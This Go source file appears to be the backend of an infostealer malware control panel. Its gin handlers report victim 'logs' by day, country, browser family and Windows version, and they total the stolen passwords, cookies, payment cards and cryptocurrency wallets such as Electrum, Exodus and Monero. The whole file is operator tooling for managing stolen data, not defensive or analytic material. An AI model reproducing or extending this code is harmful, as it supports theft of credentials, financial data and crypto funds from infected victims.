package dash

import (
	"fmt"
	"net/http"
	"sort"

	database "../../db"
	lggr "../../logger"
	utils "../../utils"
	login "../login"
	logs "../logs"

	"github.com/gin-gonic/gin"
)

var db = database.Connect()
var logger = lggr.Log()

type DaysData struct {
	Day6  int `json:"day6"`
	Day5  int `json:"day5"`
	Day4  int `json:"day4"`
	Day3  int `json:"day3"`
	Day2  int `json:"day2"`
	Day1  int `json:"day1"`
	Today int `json:"today"`
}

func GetDaysData(ctx *gin.Context) {
	if !login.CtxRootAuthCheck(ctx) {
		logger.Println("dash.GetDaysData: unauthorized user: ", ctx.ClientIP())
		return
	}

	var logsData []logs.LogsData
	err := db.Select(&logsData, "SELECT * FROM `logs`")
	if err != nil {
		logger.Println("dash.GetDaysData: get logs data from db error: ", err)
	}

	var daysData DaysData
	for _, logData := range logsData {
		if logData.Date < utils.GetTimeStamp()-518400 && logData.Date > utils.GetTimeStamp()-604800 {
			daysData.Day6++
		}
		if logData.Date < utils.GetTimeStamp()-432000 && logData.Date > utils.GetTimeStamp()-518400 {
			daysData.Day5++
		}
		if logData.Date < utils.GetTimeStamp()-345600 && logData.Date > utils.GetTimeStamp()-432000 {
			daysData.Day4++
		}
		if logData.Date < utils.GetTimeStamp()-259200 && logData.Date > utils.GetTimeStamp()-345600 {
			daysData.Day3++
		}
		if logData.Date < utils.GetTimeStamp()-172800 && logData.Date > utils.GetTimeStamp()-259200 {
			daysData.Day2++
		}
		if logData.Date < utils.GetTimeStamp()-86400 && logData.Date > utils.GetTimeStamp()-172800 {
			daysData.Day1++
		}
		if logData.Date < utils.GetTimeStamp()-1 && logData.Date > utils.GetTimeStamp()-86400 {
			daysData.Today++
		}
	}

	ctx.JSON(http.StatusOK, daysData)
}

func GetLogsCount() (logsCount int) {
	err := db.Get(&logsCount, "SELECT COUNT(*) FROM `logs`")
	if err != nil {
		logger.Println("dash.GetLogsCount: get logs data from db error: ", err)
	}
	return logsCount
}

type LogsInfo struct {
	Total     int `json:"total"`
	New       int `json:"new"`
	Today     int `json:"today"`
	Week      int `json:"week"`
	Passwords int `json:"passwords"`
	Cookies   int `json:"cookies"`
	Cards     int `json:"cards"`
	Wallets   int `json:"wallets"`
}

func GetLogsInfo(ctx *gin.Context) {
	if !login.CtxRootAuthCheck(ctx) {
		logger.Println("dash.GetLogsInfo: unauthorized user: ", ctx.ClientIP())
		return
	}

	var logsInfo LogsInfo
	logsInfo.Total = GetLogsCount()

	err := db.Get(&logsInfo.New, "SELECT COUNT(*) FROM `logs` WHERE `Checked` = 0")
	if err != nil {
		logger.Println("dash.GetLogsInfo error:", err)
	}

	err = db.Get(&logsInfo.Today, "SELECT COUNT(*) FROM `logs` WHERE `date` > ?", utils.GetTimeStamp()-86400)
	if err != nil {
		logger.Println("dash.GetLogsInfo error: ", err)
	}

	err = db.Get(&logsInfo.Week, "SELECT COUNT(*) FROM `logs` WHERE `date` > ?", utils.GetTimeStamp()-604800)
	if err != nil {
		logger.Println("dash.GetLogsInfo error: ", err)
	}

	err = db.Get(&logsInfo.Passwords, "SELECT IFNULL(SUM(`Passwords`), 0) AS passwords FROM `logs`")
	if err != nil {
		logger.Println("dash.GetLogsInfo error: ", err)
	}

	err = db.Get(&logsInfo.Cookies, "SELECT IFNULL(SUM(`Cookies`), 0) AS cookies FROM `logs`")
	if err != nil {
		logger.Println("dash.GetLogsInfo error: ", err)
	}

	err = db.Get(&logsInfo.Cards, "SELECT IFNULL(SUM(`Cards`), 0) AS cards FROM `logs`")
	if err != nil {
		logger.Println("dash.GetLogsInfo error: ", err)
	}

	err = db.Get(&logsInfo.Wallets, "SELECT IFNULL(SUM(`Electrum`) + SUM(`MultiBit`) + SUM(`Armory`) + SUM(`Ethereum`) + SUM(`Bytecoin`) + SUM(`Jaxx`) + SUM(`LibertyJaxx`) + SUM(`Atomic`) + SUM(`Exodus`) + SUM(`DashCore`) + SUM(`Bitcoin`) + SUM(`Wasabi`) + SUM(`Daedalus`) + SUM(`Monero`), 0) AS wallets FROM `logs`")
	if err != nil {
		logger.Println("dash.GetLogsInfo error: ", err)
	}

	ctx.JSON(http.StatusOK, logsInfo)
}

type MapData struct {
	Country string `json:"code"`
	Count   int    `json:"value"`
}

func GetMapData(ctx *gin.Context) {
	if !login.CtxRootAuthCheck(ctx) {
		logger.Println("dash.GetMapData: unauthorized user: ", ctx.ClientIP())
		return
	}

	var mapData []MapData
	err := db.Select(&mapData, "SELECT DISTINCT `country`, COUNT(*) as count FROM `logs` GROUP BY `country` ORDER BY count DESC")
	if err != nil {
		logger.Println("dash.GetMapData: get map data from db error: ", err)
	}

	ctx.JSON(http.StatusOK, mapData)
}

type SoftData struct {
	Name    string `json:"name"`
	Count   int    `json:"count"`
	Percent string `json:"percent"`
}

func GetSoftData(ctx *gin.Context) {
	if !login.CtxRootAuthCheck(ctx) {
		logger.Println("dash.GetSoftData: unauthorized user: ", ctx.ClientIP())
		return
	}

	logsCount := GetLogsCount()
	if logsCount < 1 {
		ctx.JSON(http.StatusOK, "")
		return
	}

	var softData []SoftData

	total := 0
	err := db.Get(&total, "SELECT IFNULL(SUM(`Chromium`), 0) AS total FROM `logs`")
	if err != nil {
		logger.Println("dash.GetSoftData: get chromium-based browsers count error: ", err)
	}
	if total > 0 {
		data := SoftData{
			Name:    "Chromium-based",
			Count:   total,
			Percent: fmt.Sprintf("%0.2f", (float64(total)*float64(100))/float64(logsCount)),
		}
		softData = append(softData, data)
	}

	total = 0
	err = db.Get(&total, "SELECT IFNULL(SUM(`Gecko`), 0) AS total FROM `logs`")
	if err != nil {
		logger.Println("dash.GetSoftData: get gecko-based browsers count error: ", err)
	}
	if total > 0 {
		data := SoftData{
			Name:    "Gecko-based",
			Count:   total,
			Percent: fmt.Sprintf("%0.2f", (float64(total)*float64(100))/float64(logsCount)),
		}
		softData = append(softData, data)
	}

	total = 0
	err = db.Get(&total, "SELECT IFNULL(SUM(`Edge`), 0) AS total FROM `logs`")
	if err != nil {
		logger.Println("dash.GetSoftData: get ie/edge browsers count error: ", err)
	}
	if total > 0 {
		data := SoftData{
			Name:    "Edge/IE",
			Count:   total,
			Percent: fmt.Sprintf("%0.2f", (float64(total)*float64(100))/float64(logsCount)),
		}
		softData = append(softData, data)
	}

	sort.Slice(softData, func(i, j int) bool {
		return softData[i].Count > softData[j].Count
	})

	ctx.JSON(http.StatusOK, softData)
}

type WinData struct {
	Win     string `db:"WinVer" json:"win_ver"`
	Count   int    `db:"Count" json:"count"`
	Percent string `json:"percent"`
}

func GetWinData(ctx *gin.Context) {
	if !login.CtxRootAuthCheck(ctx) {
		logger.Println("dash.GetWinData: unauthorized user: ", ctx.ClientIP())
		return
	}

	var winData []WinData
	err := db.Select(&winData, "SELECT DISTINCT `WinVer`, COUNT(*) as Count FROM `logs` GROUP BY `WinVer` ORDER BY Count DESC LIMIT 5")
	if err != nil {
		logger.Println("dash.GetWinData: get win data from db error: ", err)
	}

	if len(winData) < 1 {
		ctx.JSON(http.StatusOK, "")
		return
	}

	logsCount := GetLogsCount()
	for i := 0; i < len(winData); i++ {
		if winData[i].Count > 0 && logsCount > 0 {
			winData[i].Percent = fmt.Sprintf("%0.2f", (float64(winData[i].Count)*float64(100))/float64(logsCount))
		}
	}

	ctx.JSON(http.StatusOK, winData)
}
